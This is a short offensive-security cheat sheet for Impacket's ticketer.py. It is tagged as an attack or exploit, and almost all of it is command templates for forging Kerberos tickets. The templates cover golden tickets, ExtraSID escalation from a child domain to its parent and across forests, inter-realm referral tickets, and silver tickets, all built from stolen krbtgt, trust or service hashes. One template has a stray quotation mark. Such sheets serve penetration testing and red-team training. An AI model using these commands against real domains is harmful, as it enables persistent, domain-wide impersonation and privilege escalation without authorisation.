# ticketer.py (imp)

% impacket-kerberos, windows, kerberos, 88, ticket forgery

#plateform/linux #target/local  #cat/ATTACK/EXPLOIT

## desc
```
Creates a Kerberos golden/silver tickets 
```


## golden ticket  
```bash
ticketer.py -nthash <krbtgt_hash> -domain <domain_fqdn> -domain-sid <domain_sid> -user-id <user_rid|500> <user|administrator>
```

## golden + ExtraSID (parent-child)
if user = administrator no need of -user-id
```bash
ticketer.py -nthash <src_krbtgt_nthash>  -domain-sid <src_domain_sid> -domain <src_domain_fqdn> -extra-sid <dst_domain_sid>-<rid|519> -user-id <src_domain_user_rid> <user|jubeaz>
```

## golden + ExtraSID (parent-child) (dc account)
```bash
ticketer.py -nthash <src_krbtgt_nthash> -domain-sid <src_domain_sid> -domain <src_domain_fqdn> -extra-sid <dst_domain_sid>-<rid|516> -user-id <src_domain_user_rid>  '<dc_name>$'
```

## golden + ExtraSID (cross-forest)
if user = administrator no need of -user-id
```bash
ticketer.py -nthash <src_krbtgt_nthash>  -domain-sid <src_domain_sid> -domain <src_domain_fqdn> -extra-sid <dst_domain_sid>-<rid> -user-id <src_domain_user_rid> <user>
```

## golden Inter-Realm TGT (referal)
KRB5CCNAME=/tmp/jubeaz.ccache getST.py -k -no-pass -spn <cifs>/<dst_dc_fqdn> <dst_domain_fqdn>/<user>@<dst_dc_fqdn> -debug
```bash
ticketer.py -nthash <src_trust_nthash> -domain-sid <src_domain_sid> -domain <src_domain_fqdn> -extra-sid <dst_domain_sid>-<RID|519>" -spn "krbtgt/<dst_domain_fqdn>" -user-id <src_domain_user_rid> <user|jubeaz>
```

## silver ticket
```bash
ticketer.py -nthash <service_nthash> -domain-sid <domain_sid> -domain <domain_fqdn> -spn <svc>/<target_fqdn> -user-id <user_rid|500> <user|administrator>
```